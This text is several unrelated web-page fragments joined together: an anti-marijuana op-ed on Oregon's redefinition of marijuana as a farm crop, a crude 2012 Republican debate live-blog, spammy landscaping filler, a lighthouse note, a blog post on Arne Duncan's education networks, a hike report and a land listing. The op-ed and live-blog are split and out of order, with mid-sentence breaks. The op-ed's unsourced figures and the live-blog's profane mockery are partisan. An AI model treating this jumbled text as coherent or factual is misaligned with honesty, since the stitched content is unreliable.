nuisance lawsuits against farmers who use accepted and standard farming practices, and it does not require any neighbor notification or conditional use permits. It allows only the state to regulate it without jurisdiction control.</p>   <p>What does this means for Oregon&#x2019;s rural farming residents? It means a complete and utter takeover of all of Oregon&#x2019;s rural residential farming communities. While it was the urban voters who voted yes for marijuana legalization, it was the rural voters who voted no who are being most impacted.</p>   <p>Rural Oregon farming residents are seeing large out-of-state land grabs for the sole purpose of growing commercial recreational marijuana. So imagine, one day you have a horse pasture next to your home and the next day this 40 acre pasture has been turned into a 300&#x2019; x 700&#x2019; compound completely surrounded by a 6&#x2019; high fence with 10 rows of barbed wire on the top not only blocking your once beautiful view, but omitting the skunk smell of pot, 24-hour a day lighted greenhouse that lights up the night sky for miles, and increased traffic completely changing the rural farming character and culture that you have enjoyed.</p>   <figure>    <figcaption>     Rep. Earl Blumenauer advocates for marijuana legalization, which conflicts with . Rural life in his district is being destroyed. Photo: AP    </figcaption>   </figure>   <p>Congressman Earl Blumenauer &#x2014; who promotes marijuana in Oregon and is trying to legalize marijuana at the federal level &#x2013;has many his rural residential farming constituents in his district unhappy with him. Here&#x2019;s a letter Rachel McCart wrote to Rep Blumenauer.</p>   <p><em>&#x201c;Dear Congressman Blumenauer: </em> <em>I have voted for you in previous elections and want to let you know why I will not be voting for you in future elections. I cannot support your efforts to legalize marijuana at the federal level. Here&#x2019;s why. </em> <em>I, like many other voters, voted for Measure 91 with the idea that decriminalizing possession of small amounts of marijuana and allowing individuals to grow up to four plants at their home would result in reducing law enforcement burdens and getting illegal, dangerous grows out of public and tribal land. What I did NOT vote for was having marijuana classified as a &#x201c;crop&#x201d; for the purposes of the Right to Farm Act. </em> <em>The result has been an explosion of marijuana production and processing in our Beavercreek rural community, with Clackamas County having little ability and almost no resources available to ensure that marijuana-related land uses are reasonable and safe. Razor-wire fences, <b>iron</b> <b>gates</b> and no trespassing signs are springing up everywhere in our formerly picturesque, quiet and safe community.&#x201d;</em> Rachel Kosmal McCart</p>   <h2>Compared to Colorado</h2>   <p>Compared to Colorado, for example, recreational marijuana is not allowed to be grown outside of industrial areas. Over 70% of Colorado, Washington, and Oregon jurisdictions have banned medical and recreational grows, processing sites and stores in their communities. Those counties and cities who have decided to Opt In to the cash-mongering goals of the pot advocates should be reminded that marijuana is still federally illegal. County and city officials who take an oath to serve both State and Federal laws put themselves in a position of aiding and abetting the illegal drug market.</p>   <p>The complete and utter takeover of our rural residential farming communities through the redefinition of marijuana as an agricultural farm crop is inflaming rural Oregon voters. To complicate this outrage even more, the Oregon Liquor License Commission is issuing more than one recreational marijuana growing license to one site address.&#xa0; What this means for Oregon rural farming residents is that a landowner can receive a marijuana growing license on a tiered system and be allowed to have one 5000-10,000 sg. Ft. indoor marijuana grow and one 20,000 to 40,000 sg. Ft. outdoor marijuana grow.&#xa0; Then the landowner can lease the rest of his land to other marijuana growers therefore using the entire piece of land just to grow marijuana. In some areas of Oregon, 86 to 100 acre parcels have been purchased by out-of-state investors just to grow marijuana without any consideration to the impacts of neighbor&#x2019;s public safety, quality of life, or property values.

   <div>   <p><small>From time to time, here at Hammer of Truth one of us will . This is what it looks like.</small></p>   <p>On Wednesday February 22nd 2012, four GOP candidates for president got on stage to once again lay into each other in the <del>new public blood sport</del> democratic process of of getting to know our next commander in chief. From left to right on the stage were Ron Paul, Rick Santorum, Mitt Romney and Newt Gingrich. Most people have been more interested in Whitney Houston&#x2019;s sudden death over the past week and a half than anything political, so we&#x2019;ll see if the first post-Whitney GOP debate is a pop or a drop amongst the American rabble.</p>   <p>The complete transcript of the debate can be found . Ron Paul highlights can be found . Read on for our official Hammer of Truth verdict on the debate and be sure to leave your thoughts on how the candidates did. </p>   <p><small>All times are <strong>EST</strong> (I hated having to add that shit on every update, so hurray efficiency):</small> </p>   <p><strong>19:40</strong> CNN doing pregame prep on their stage, before it was a shot of the White House being patrolled by men in trench coats. It seems we&#x2019;re having everyone in the sit-down format this time, so we&#x2019;ll probably get a few nice tight shots of some angry finger pointing.</p>   <p><strong>19:44</strong> CNN Saying the Arizona GOP is co-hosting this with them is like saying a fat kid who gets a pin from the airline is a pilot. They will be allowed to approach microphones in the audience area like the other peons, CNN hosts will be the only persons allowed on stage with the candidates.</p>   <p><strong>19:57</strong> I&#x2019;m really digging CNN&#x2019;s style, now if they will only bring some substance this time. One question we&#x2019;d love to see tweeted about a bajillion times is how the candidates feel about over a minor amount of marijuana. There, insta-substance <em>plus</em> style points.</p>   <p><strong>20:04</strong> Candidates have just been introduced. They are all mic&#x2019;ed up individually so there&#x2019;s a good chance we&#x2019;ll hear some under the breath snipes between candidates, and certainly lots and lots of sighing.</p>   <p><strong>20:10</strong> Santorum talking about how he&#x2019;s going to end all those damn welfare for corporations. No wait, he&#x2019;s going to get rid of entitlement programs for lazy poor people. Santorum keeps acting like Santorum is going to happen. Hold hands with Gingrich and please go away.</p>   <p><strong>20:11</strong> Romney lives in the world of business, he balanced his budgets. He also balances on the fence on damn near every issue until he sees which one is winning.</p>   <p><strong>20:14</strong> Santorum reminds everyone that Romney raised taxes. Romney says no no no, he&#x2019;s going to cut taxes. Come on, you can trust him, he has gray sideburns.</p>   <p>Gingrich gets involved and starts jabbering about how he&#x2019;s going to balance the budget, by exploiting oil and natural resources. Millions of oily oily jobs. I&#x2019;m excited at this oil-covered Gingrich future.</p>   <p><strong>20:18</strong> CNN asks why Paul says Santorum is a fake. Paul says because he is. Massive applause. Points out that Santorum voted for No Child Left Behind but is now running against it. Santorum&#x2019;s face is a snarled mess. Paul says out they are all big spenders on foreign aid.</p>   <p><strong>20:19</strong> Santorum talks about some endorsements from some psuedo-conservative organizations no one gives a shit about. The crowd laughs because he&#x2019;s talking fast and acting nervous. Ron Paul ranked in the bottom with that clearly stacked organization. Paul comes back and calls that comparison answer a &#x201c;cop out&#x201d;.</p>   <p><strong>20:22</strong> Back to Romney, he was a &#x201c;severe, strict&#x201d; governor of Massachusetts and he will gladly rule America with that same Iron Fist. For the children.</p>   <p><strong>20:24</strong> Gingrich gets a question about supply side economics. His face goes blank as he tries to figure out how to change the subject. Oh look, he changed the subject to a populist &#x201c;modern border control&#x201d;. Hello Arizona, Gingrich has ADD.</p>   <p>&#x201c;Let&#x2019;s get back to a balanced budget&#x201d; like the line of credit he had with Tiffany&#x2019;s.</p>   <p><strong>20:29</strong> Santorum lays into Romney over earmarks for Salt Lake City Olympics funding. He can barely defend his record on earmarks so he&#x2019;s trying to take everyone down with him, including Bush and Cheney. Santorum would oppose earmarks as president, someone in the audience boos. Romney calls the process broken, and then elaborates on how he exploited it &#x201c;to save the Olympics&#x201d;.</p>   <p><strong>20:31</strong> SCREEN GRABS OF THE MOMENT. Knee slapping between the three stooges when Romney is the butt of the joke, and Ron Paul having a teaching moment:</p>   <p><strong>20:32</strong> ALL HAIL HYPNO-CNN.</p>   <p><strong>20:36</strong> Romney is pretty good at business, this much is true. Are his hands clean? That&#x2019;s a definite no, so that&#x2019;s why he supports TARP, but not GM bailout.</p>   <p>Because&#x2026; deep breath&#x2026; <em>&#x201c;ALL THE BANKS COULD HAVE COLLAPSED&#x201d;</em>. What a load of hooey.</p>   <p>His favorite word: &#x201c;managed bankruptcy&#x201d;. Sounds a lot like a nod to .</p>   <p><strong>20:41</strong> Paul says all &#x201c;bailouts are bad, and we shouldn&#x2019;t be doing it.&#x201d; Gives us an analogy to a criminal robbing people, being good at it, and so for that reason being allowed to continue. Bankruptcy for General Motors would have been natural, also for banks.</p>   <p><strong>20:43</strong> Finally a commercial break, these guys jabbering on is hard to follow with a keyboard. Once again Paul is being marginalized (with tricky camera angles only showing Santorum/Romney/Gingrich being the worst culprit and a lack of questions being a close second). John King is less of a douche tonight, letting the candidates do all the talking and encouraging the crowd booing.</p>   <p><strong>20:47</strong> Gingrich bringing back the &#x201c;elite media&#x201d; dog whistle, I wonder if the elite media can get lines of credit at Tiffany&#x2019;s. They are going apeshit over birth control, one of the worst wedge issues in modern politics. Romney calling people liberal on any issue is just trolling.</p>   <p><strong>20:49</strong> Santorum says contraception is dangerous. Teens are sexually active! Children raised by chidren, drug use, anarchy, nihilism. &#x201c;EVERYTHING IS NOT GOING TO BE FINE!&#x201d; I bet he drinks a lot.</p>   <p><strong>20:51</strong> Paul says get the government out of medical issues. The &#x201c;pills can&#x2019;t be blamed for the morality of society&#x201d;.</p>   <p><strong>20:52</strong> Romney says too many kids being born out of wedlock, asks &#x201c;how are we going to have a society?&#x201d; Kids being in a home with a mother and father gets applause, loaded language indicates &#x201c;a mother and a mother&#x201d; or &#x201c;a father and a father&#x201d; is not the society he&#x2019;s willing to entertain. Unless it polls higher in this primary state.</p>   <p><strong>20:55</strong> Oh look, Gingrich has something to say about family values, everyone try not to laugh. Surprise, he changed the subject to coercion of the state to try and appeal to libertarians.</p>   <p><strong>20:56</strong> Paul teaches everyone about the chemical structure of birth control pills and morning after pills (they are very similar). Did we mention he&#x2019;s an actual fucking doctor?</p>   <p><strong>20:58</strong> Someone please make a dubstep song with Santorum saying &#x201c;children being sexually active&#x201d;. I predict great reception.</p>   <p><strong>21:02</strong> Santorum and Rmoney get into a heated fight over Obamacare and Rmoneycare.</p>   <p>Santorum writes &#x201c;eat me, you cunt&#x201d; on a piece of paper while Romney <del>angrily</del> louder than normally tries to defend his record. Santorum circles and draws him out   <div>   <div>    <p>There are many factors to consider in landscape design El Mirage <b>AZ</b> 85335. Landscaping can be a do-it-yourself project or can be done by landscape professionals like landscape architects and contractors. Some of the first things to consider are money, time and effort. A budget should be determined to limit overspending. The amount of time and work put into landscaping should also be taken into account. Some other factors might include climate, soil and regulations. Normally, the first step in landscaping is planning. Computer software can be used to model the property being landscaped. Maps and blueprints might be drawn up to show the layout of features and boundaries. Photographs may be taken along with notes to help fill in details. Once the big picture can be seen, lists are made for the types of materials to be used, the types of plants to be added and the tools and equipment that will be needed to do the work. The teams in El Mirage <b>AZ</b> 85335 are great.</p>    <p>In&#xa0;El Mirage <b>AZ</b> 85335 the beginning stage of landscape planning, the elements and theme need to be decided. Water issues have to be addressed such as irrigation and drainage. Installing an irrigation system may require a professional landscaping contractor. Pipes, sprinklers and timer with electrical system should be included in landscaping plans. If the landscaping theme includes swimming pools, waterfalls, fountains or a pond, a landscaping service should also be considered. The amount of light should be taken into account when landscaping.</p>    <p>The types of trees and plants can be a factor in achieving a balance between sun and shade. Different types of lighting at nighttime can add to a landscape&#x2019;s effects. These include up lighting where lights shine from below, down lighting, silhouetting or the addition of lamps, floodlights, or lanterns. Various types of themes are possible but generally depend on the region and the climate. Desert themes that use cactus and plants that are used to dry environments and tropical themes would be more appropriate for warmer climates. Other types of themes might be Japanese, mountain or a winter theme with evergreens.</p>    <p>Some of the preliminary landscaping tasks that might have to be done before planting include soil testing. The pH level has to be set to the type of plants being used. Plant nutrients might also have to be added.</p>    <p>The types of materials to be used may depend on the structures to be built on the landscape. Walkways, steps, paving and retaining walls might require materials used in masonry like brick, stone, sand and concrete. Decks, gazebos, <b>gates</b> and trellises as well as a fence might require a large amount of wood especially in El Mirage <b>AZ</b> 85335</p>    <p>Depending on the task and the materials used, the types of tools and equipment should be selected. Shovels, mattocks and wheelbarrows might be needed when working with dirt. Working with wood might require a saw, hammer and screwdriver as well as a lever, tape measure and drill.</p>    <p>The different plants that should be taken into account include trees, shrubs, grass, flowers and hedges. Some of the popular types of trees include cedar, ash, walnut, popular, oak, fir and pine. Popular flowers include daisies, lilies, aster, iris, tulips, daffodils and rose bushes.</p>    <p>The amount of maintenance with associated tasks also has to be considered when planning a landscape. These tasks include but are not limited to cleaning, fertilizing, lawn care, leaf removal in fall and mowing along with other types of yard work. In winter, snow removal tasks such as salting would have to be considered for its effects on plants that are part of the landscape. If a landscaped property requires too much maintenance for the owners to do it themselves or if a special project or task has to be done, landscape professionals should be brought in to help, especially for very large problems.</p>    <p>There are tree services that can remove dead trees and stumps. Landscape contractors can also perform certain construction tasks like building terraces, driveways, swimming pools and baseball fields. They can also take over routine jobs like grounds keeping, lawn care, pruning, raking and snow removal in winter. Some landscape service companies perform landscape architect design as well as contracting.</p>   </div>   <div>    <p>Planning, designing, building, raking, pruning and mowing lawns are just some of the landscaping services [that are performed by landscaping designers and landscape contractors [When planting grass for a new lawn, they can do soil testing and optimum tree and plant selection. Other landscaping tasks that can be tackled include small construction projects like building a deck, pond or wall either for privacy or retaining earth. Irrigation problems and water drainage can be addressed by installing an irrigation system for watering plants while creating dry wells, berms and ditches for water runoff when it rains.</p>    <p>Landscapers provide services for many different types of property whether residential, commercial or industrial. Home landscaping might include the addition of a swimming pool, lawn or garden while business landscaping might include groundskeeping,these are great in&#xa0;El Mirage <b>AZ</b> 85335 planting shrubbery and adding mulch. Office buildings, golf courses, cemetaries, baseball fields and common areas are just some of the facilities that landscapers service. Landscapers can help with problems such as codes, plant and tree diseases, insects, pests, stumps, traffic and weeds.</p>    <p>Some of the additional facitities that landscape companies can service include apartment buildings, college and school campuses, highway medians and roads, hospitals, parks, playgrounds, shopping malls and other recreation areas. While many businesses hire landscape contractors for groundskeeping the home owner may decide to build their own landscaping project. If time and complexity are significant factors, however, landscape architects and landscaping contractors can help with their services.</p>    <p>&#x2013;</p>   </div>  </div>

Its five-wick lard oil lamp, and first-order Fresnel lens, comprised of 1,008 prisms, was first lit at sunset, November 15, 1872. The lens stands 16 feet tall, 6 feet in diameter, and weighs 2,000 pounds. Now on display in the Fog Signal building, it sat in a lantern room constructed at the Lighthouse Service&#x2019;s general depot in New York before being shipped around the Horn. Although the original Fresnel lens is no longer in use, the lighthouse is still an active U.S. Coast Guard aid to navigation using a Vega Marine Rotating Beacon.&#x201d;</p>   <p>Land-side view of the lighthouse.</p>   <p>The lighthouse was closed for repairs so all we could do was walk around the grounds.

regon Liquor License Commission also is not putting any limits on the number of marijuana growing licenses that will be issued, meaning that an entire rural residential farming community can be taken over by large recreation marijuana grows.</p>   <h2>Problems California Must Recognize</h2>   <p>California is currently working to regulate their existing medical marijuana program through a bill called AB243. Below is the verbiage of a portion of this bill &#x201c;medical cannabis is an agricultural product.&#x201d;</p>   <p>11362.777. (a) The Department of Food and Agriculture shall establish a Medical Cannabis Cultivation Program to be administered by the secretary, except as specified in subdivision (c), shall administer this section as it pertains to the cultivation of medical marijuana. For purposes of this section and Chapter 3.5 (commencing with Section 19300) of the Business and Professions Code, medical cannabis is an agricultural product.</p>   <p>What does this mean for rural farming residents of California? That is a question all rural farming residents should be asking in all States concerned about the impacts of marijuana in their communities.</p>   <p>In closing, I would like to warn other states about this immunity redefinition of marijuana as a farm crop loophole. Although many innocent voters have been misled by the highly funded ballot initiatives that push the so-called &#x201c;medical&#x201d; marijuana and recreational marijuana schemes, many citizens have observed the impacts first hand and are standing up to these deceptive attempts to try and ignore the impacts to public safety, quality of life, and property values. Drugged driving, diversion to other States, destruction to the environment, diversion to minors, public consumption, robberies, burglaries, fatal shootings, odors, increased traffic, fires, hash oil explosions are just a few of the impacts that marijuana leaves behind. The scheme of medical marijuana and marijuana legalization leads to the degradation of our neighborhoods and it is important that citizens begin to inform their communities.</p>   <p><em>Shirley Morgan lives in Oregon and has a BA in Human Communications from Marylhurst University in West Linn (1999), Oregon; MA in Whole System Design/Organizational System Renewal from Antioch University in Seattle (2003), Washington; MS in Community and Economic Development from Southern New Hampshire University-Manchester, New Hampshire (2008); Associates of Church Leadership-Portland Bible College, Oregon (2015)</em> <span>References</span> 1.

. Paul and Gingrich laugh at the tangle. The crowd begins to boo both of them, so John King moves to an audience question.</p>   <p><strong>21:06</strong> Paul fields a question on border enforcement, says we could do a better job securing our own borders than the ones in the Middle East, snap. Says there should be no mandate by the federal government, calls immigration inefficient. Romney coughs loudly.</p>   <p><strong>21:09</strong> <em>SNAP ASSESSMENT:</em> The GOP is good at building walls and telling other people to tear theirs down. Guess we won&#x2019;t be talking about the next step within walled society, which is internal checkpoints.</p>   <p><strong>21:10</strong> Romney endorsed e-verify and REALID and you should just be a good American and get chipped already to work that job because that&#x2019;s obviously preferable to some dirty immigrants takin yer jerb.</p>   <p><strong>21:13</strong> Gingrich &#x201c;voted in 1986&#x201d; for the bill that was supposed to solve all the immigration problems. Of course that bill failed. May we remind the former House Speaker that those who give up essential liberty for temporary security will get neither?</p>   <p><strong>21:20</strong> King asks for one word from each candidate to label themselves with: Paul &#x2013; consistent Santorum &#x2013; courage Romney &#x2013; resolute Gingrich &#x2013; cheerful</p>   <p><strong>21:22</strong> My one word for each candidate: Paul &#x2013; underdog Santorum &#x2013; shitty Romney &#x2013; flipper Gingrich &#x2013; philanderer</p>   <p><strong>21:24</strong> Paul says he&#x2019;s afraid a draft is in the making with all these wars. He doesn&#x2019;t want men or women being killed in wars, calls pre-emptive war morally unjust. Defensive posture only. Doesn&#x2019;t call tonight. Santorum, Romney and Gingrich all more support foreign entanglements because lol, not their ass.</p>   <p><strong>21:26</strong> Gingrich saber rattles at Iran, calling him a dictator. Romney says enact &#x201c;crippling&#x201d; sanctions. Santorum says sanctions plus more saber rattling. Here&#x2019;s a not-scary map of Iran&#x2019;s threat to America:</p>   <p><strong>21:32</strong> Paul says, they feel threatened, so they seek weapons&#x2026; he says look at the map (that I just posted, lol). Paul says worry more about the Soviet-era nukes than new hypothetical nuke programs. Paul warns that war must be declared, and not to do it lightly.</p>   <p><strong>21:35</strong> King changes topic to Syria. Same question, different bullshit. Santorum calls them an &#x201c;axis&#x201d; and would be more aggressive in the Middle East. Calls the situation &#x201c;cataclysmic&#x201d;. If Santorum is elected I expect the bunker industry to boom thanks to his paranoia.</p>   <p><strong>21:37</strong> Gingrich wants to engage the entire region. There&#x2019;s a multiple partners joke in there somewhere. Romney wants to get involved in Syrian conflict, because&#x2026; America: world police.</p>   <p><strong>21:39</strong> Paul &#x201c;I tried the moral argument, I tried the constitutional argument&#x201d;. He switches gears to then the financial argument, &#x201c;we don&#x2019;t have the money&#x201d;. He goes on, &#x201c;I&#x2019;m going to win this argument for the economic reason &#x2026; The Soviets left because they were broke.&#x201d; Big applause.</p>   <p><strong>21:47</strong> EDUCATION! Everyone on the stage: got mine, up yours. Oh wait, we will help you with pretty school buildings. Gingrich says rebuild from ground up. Ron Paul goes last and gets biggest applause for his radical platform to ends the federal Department of Education and return the issue of education back to the states. Consistent.</p>   <p><strong>21:51</strong> King poses the biggest misconceptions question to each candidate.</p>   <p>Paul: &#x201c;That I can&#x2019;t win&#x201d;. Says to look at his to the rallies (and they are sizable, yes), that misconception is not present. Gingrich: The amount of work he did, many many many years ago. Romney: goes offtopic, then scolds King when he tries to help steer him. Delivers a stump speech instead of answering the question. Santorum: follows Romney&#x2019;s lead and talks about how much money Obama has raised. Another stump speech.</p>   <p><strong>21:56</strong> Show&#x2019;s over, CNN&#x2019;s King thanks the Arizona GOP. They can each expect a commemorative pin in the mail for their help in selling out the democratic process in another lame-ass &#x201c;debate&#x201d;.</p>   <p><strong>0:29</strong> Thank you to Betty Liberty for pointing out Santorum&#x2019;s .</p>   <p>No Rick, we told to you hold hands with Gingrich and leave.

He was the head of of early political appointees who had personal connections to President Obama.</p>    <p>He was joined in 2009 by some of the most powerful members of a Democratic-leaning group of education reformers: among them were Deputy Secretary Jim Shelton, a former leader of education policy at the Bill and Melinda Gates Foundation, and Joanne Weiss, the Chief Operating Officer at NewSchools Venture Fund who became Duncan&#x2019;s chief of staff. is a venture philanthropy firm that sponsors the growth of charter school chains.</p>    <p>In 2009, both organizations were part of a growing network of advocates which Michigan State University political scientist the Boardroom Progressives.</p>    <p>These reformers have largely consisted of private actors, including leaders of education nonprofits, charter school founders and other nontraditional school leaders whose essential resources for reform come from the private wealth of major foundations, an approach that Berkeley education professor Janelle Scott has termed .&#x201d;</p>    <h4>Did those connections matter?</h4>    <p>The network that swirled around Duncan gave him ideas that he promoted through the Obama stimulus, and also the skilled personnel to run those programs.</p>    <p>Members of Duncan&#x2019;s reform network were partly the genesis and of a grant program, , that required applicants to expand opportunities for charter school creation, eliminate firewalls between student test scores and teacher evaluation, and commit to so-called &#x201c;college and career-ready standards.&#x201d; (The most common commitment of applicant states to such standards was to the .)</p>    <p>Once Duncan&#x2019;s department announced the Race to the Top program, the network connections were critical to promoting it. Under Duncan, Weiss ran the Race to the Top program.</p>    <p>But building support for his policies was also political: since 2001, federal education policy has often provided rhetorical and political license to state politicians who wanted support for policies they wanted anyway &#x2013; Paul Manna, Government Professor at William &amp; Mary College, called this license &#x201c;borrowed authority&#x201d; in his book about the politics of the No Child Left Behind Act.</p>    <p> continued this pattern, and many members of the network of education advocacy organizations the Common Core and the expansion of charter schools in many states.</p>    <p>Finally, the network was to directly or indirectly building state capacity in the Race to the Top years. In some cases, network members became critical state leaders, as they had under Duncan in Washington, DC.</p>    <p>In other cases, members of the network served as free consultants or as paid contractors for states that did not have the expertise to apply for or carry out Race to the Top projects. The Gates Foundation provided to states that agreed with the foundation&#x2019;s set of criteria.</p>    <h4>Why care about these networks &#x2013; isn&#x2019;t this how politics works?</h4>    <p>At one level, the influence of the education reform network around Duncan is not a surprise: political scientists have written for decades about the relationships between private actors and public policy. That intrigue is the source of terms such as and .</p>    <p>If public-private relationships are not new in policymaking, we should also not assume that the network around Duncan has been monolithic or inherently cohesive. As political scientist , the alliances have been evolving rather than centralized and tightly planned.</p>    <p>And yet, we should worry when substantially outside ordinary public politics by an increasingly private set of actors, whose with the public sphere can simultaneously be rivalrous, symbiotic and parasitic.</p>    <p>One does not need to be paranoid to worry about the concentration of decision-making in the hands of people who are friends and who are not accountable to the general public.</p>    <h4>The legacy of Duncan</h4>    <p>Maybe you approve of Arne Duncan&#x2019;s policies and are happy with his network because it moved policy. But after the Republicans swept the 2010 midterm elections in dozens of states, a conservative network agenda in state house after state house.</p>    <p>That ascendant Republican network, the American Legislative Exchange Council (ALEC), used the reform rhetoric and regulatory momentum of Arne Duncan for its own ends. Some of those goals mirrored Duncan&#x2019;s &#x2013; teacher evaluation tied to student test scores and expanded charter schools.</p>    <p>Others did not. Since 2010, many Republican-controlled states have attempted to restrict teacher collective bargaining and created or expanded private school voucher programs.</p>    <p>Arne Duncan did not invent political networks. And yet, to use , he has acted as a by bringing a private network to the fore in education, and further opening public education to privatized influences.</p>   </blockquote>   <p>The question&#xa0;left unanswered&#xa0;at the end of&#xa0;the article: what&#xa0;<em>is</em> the proper relationship between civil society and regulatory/administrative bodies? Tune in next time&#x2026;</p>   <p>Now, a little bit on the back-end of writing a piece like this on short order. I was sent the invitation by an editor at Monday afternoon, shortly before a research meeting I had with Amanda Potterton, and we agreed to work on it over &#x2026; about 38 hours. The usual parameters for pieces like this included a space&#xa0;limit, around 800 words (which ballooned a bit in editing). We also&#xa0;worked&#xa0;out what we could say that others have not said before; we mentioned&#xa0;the common themes of other news stories and blogs in the first paragraph and linked to examples (including one from 2009 that is still relevant). We quickly identified and pored over some relevant literature, drafted the text on Tuesday, and worked with the site&#x2019;s editors on Wednesdays to finish editing it.</p>   <p>There were plenty of scenes left on the cutting-room floor&#x2013;my favorite is the confrontation between Billy Crystal&#x2019;s Miracle Max and Robert Downey, Jr.&#x2019;s Tony Stark. In the draft, the battle destroyed Chicago. But it&#x2019;s lost to the ages now.</p>   <p>No, there really were ideas left out of this &#x2014; when you have a tight word-limit, you have essentially one point to make, and we tried to squeeze 1.5 points&#xa0;into it. We did not talk about Arne Duncan as a regulator and his expansion of the regulatory role of USDOE. I guessed that he coordinated policy better with the White House than the majority of cabinet secretaries, but that is not documented and probably a &#x201c;who cares?&#x201d; point for anyone but political&#xa0;junkies. We talked about Duncan as a somewhat gaffe-prone secretary, but his suburban-moms quip doesn&#x2019;t &#xa0;come close to either Margaret &#x201c;NCLB is 99.9% pure&#x201d; Spellings or Rod &#x201c;NEA is a terrorist organization&#x201d; Paige. So we settled on&#xa0;influence networks, leaving out the &#x201c;what is the proper role&#x201d; question.</p>   <p>And speaking of proper roles, what is left for someone else to tackle is how Duncan changed the role of the Secretary of Education. Remember, he is only the ninth in the department&#x2019;s history. If we had focused on what Duncan left the next secretary at an institutional level, below are the most prominent roles of the Secretary of Education at the end of the Duncan era:</p>   <ul>    <li>Implementer of major education statutes&#xa0;(inherited from when there was an Office of Education in the Department of Health, Education, and Welfare [HEW])</li>    <li>Regulator for education programs (inherited from HEW days)</li>    <li>Proxy bully pulpit on education issues (Terrel Bell, most prominently)</li>    <li>Manager of the department (inherent in the role)</li>    <li>Developer of education policy (relationship with White House staff)</li>    <li>Hub of a mostly-private network (Arne Duncan)</li>   </ul>   <p>In parentheses for each is my rough guess at the origin of the role.</p>   <div>    <div>     If you enjoyed this post, please consider to have future articles delivered to your feed reader.    </div>   </div>  </div>

With a fire road hike bringing you to an antennae farm at the summit, the hike doesn&#x2019;t off the most genuine of wilderness experiences, yet it&#x2019;s still makes for a great work out with fantastic views across the Valley. The trailhead for Thompson Peak is strangely in the middle of a gated community in Fountain Hills. The parking lot for the trail is located outside the community, and with brand new facilities, it looks more like a California winery than a trailhead bathroom.</p>   <figure>    <figcaption>     Nice TH facilities.    </figcaption>   </figure>   <p>From the parking area, one must walk through the neighborhood several blocks to get to the trailhead into the preserve. Unlike most of the other trailheads in the McDowells, this requires a small entrance fee, $2/ person, which we paid to the Iron Ranger on our way through. Thompson Peak is visible for the majority of the hike, although early on, the trail weaved in and out of about a dozen washes running tangent to the range. The trail meandered through the desert, with stunning views to the east, already quite high above the basin.</p>   <figure>    <figcaption>     Weaving around washes.    </figcaption>   </figure>   <p>After 2.7 miles, we intersected the main fire road that led to the summit of Thompson. Just beyond the road was Dixie Mine, one of several mines in the McDowells originally owned by the Red Mountain Consolidated Copper Mines Co. in the early 1900s, and turned over to the park system in 1977.</p>   <figure>    <figcaption>     Dixie Mine.    </figcaption>   </figure>   <p>We stopped here for a short break and eyed the road ahead. Up to this point, we had gained very little elevation, and the route significantly steepened with 1700&#x2032; of gain in the last 2.3 miles. The grade of the fire road quickly increased, and became paved in the steepest sections, something I&#x2019;ve only found in Arizona.</p>   <figure>    <figcaption>     Upper steepness.    </figcaption>   </figure>   <p>As we hit the ridgeline, the road briefly flattened, but subjected us to harsh winds which we had avoided all day. Trying to pick up the pace to find shelter from the wind, I was impressed with the steepness of the road switching below the summit, one of the steeper fire roads I&#x2019;ve been on. At times, we almost needed to steady ourselves with one hand on the near 60 degree slope. The grade eased as we hit the very developed summit. The gate into the antennae area was open, and a group of hikers were taking shelter from the wind behind some of the buildings. We did likewise, and had a short lunch looking out across the valley. We could see all the tents from the Waste Management Open in Northern Scottsdale, and I was glad to be nowhere near the traffic on the 101 far below.</p>   <figure>    <figcaption>     Summit Panorama.    </figcaption>   </figure>   <p>After finishing our light lunch, we headed down the steep road, jogging in places to get back below the ridgeline and out of the wind. The views on the descent were some of the best of the day, looking east to Four Peaks with some lingering snow in the gullys.</p>   <figure>    <figcaption>     The descent. Four Peaks in the distance.    </figcaption>   </figure>   <p>We took a short break at the end of the steep stretch before picking up the pace on the flatter ground and hiking the 3ish uneventful miles back to the car.</p>   <div>    <div>     <h3>Share this:</h3>    </div>   </div>   <div>    <h3><em>Related</em></h3>   </div>  </div>

Spring Creek Ranch currently has 15 fully improved 2 Plus acres lots on 35 Acres-Paved Roads which is gated with wrought iron entrance with key pad.</p>   <p>Conveniently located in the geographic heart of Arizona, 8 mi to Sedona and 8 mi to Cottonwood, it is accessed from a private paved road and gate off of scenic Hwy 89A. The property fronts nearly a mile of Spring Creek with several springs and a nature trail. The topography is varied with the creek providing fresh water all year round to a lush riparian habitat within the ranch, gently sloped hillsides and rocky outcrops with dominating views.</p>   <p>Spring Creek Ranch is a natural retreat which is immersed and is surrounded by 3 sides of the Coconino National Forest, and State land on the west. While the 210 acre greater part of the land is untouched. Spring Creek runs through the center of the property for exactly one mile.

   <div>   <i>California let's change our state! Please tell others about Stop Pot 2016!</i>    <p><em>By Shirley Morgan</em> As the founder of the , a national volunteer outreach with a focus on the impacts of marijuana in our communities, I want to convey loud and clear that the recent decision by Oregon&#x2019;s legislature to redefine marijuana as an agricultural crop should not be ignored!&#xa0;&#xa0; </p>   <p>Marijuana advocates and pro-marijuana legislators are outright trying to takeover Oregon&#x2019;s rural farming communities for the sole purpose of growing recreational marijuana. They have done this by redefining marijuana as an agricultural crop through House Bill 3400. This happened because in Oregon medical marijuana program was set up as a bridge to marijuana legalization; then out-of-state donors funded legalization; the vote passed and the legislature redefined marijuana as an agricultural farm crop.</p>   <p>First, recreational marijuana was legalized in Oregon in 2014 under a statutory ballot measure that was funded by a $5.3 million dollar out-of-state campaign. Marijuana lobbyists and pro-marijuana legislators waited with bated breath to see if polling guidelines around the public&#x2019;s acceptance of a tax and regulate scheme would pass. It passed 55.6%, yes and a 44.4% no! It was the urban voters who said yes and rural voters who said no, yet it will be the rural voters who will be most impacted by marijuana legalization in Oregon.</p>   <p>Advocates of Measure 91 blasted the airwaves with their message knowing that local efforts would have a difficult time matching their out-of-state financial efforts, since all of their money was coming in from the billionaires whose dream is to legalize all illegal drugs, therefore making it difficult for the general public to hear the real truth about the dangerous impacts of marijuana.</p>   <p>Second, according to the Oregon Health Authority there are over 47,430 unregulated medical marijuana growers growing for cardholders. The Oregon Liquor License Commission was given the task to set up rules for Oregon&#x2019;s new marijuana program. That commission has indicated that at least 75% of the medical marijuana in Oregon goes to the underage and out-of-state black market. So legislators went to work to find ways to control Oregon&#x2019;s medical marijuana program by reducing the number of cardholders that each medical marijuana growers may provide for and reducing the number of marijuana plants that could be grown at one site address. If they couldn&#x2019;t reduce these quantities, then Oregon&#x2019;s new recreational marijuana would have a difficult time surviving. From the beginning, controlling medical marijuana was the tool that was used by the pro marijuana advocates to set the foundation for full and outright marijuana legalization.</p>   <p>Third, once the marijuana legislators realized that the marijuana legalization program was only going to succeed if they were able to curtail the current unregulated medical marijuana program, they opened the door to the growers 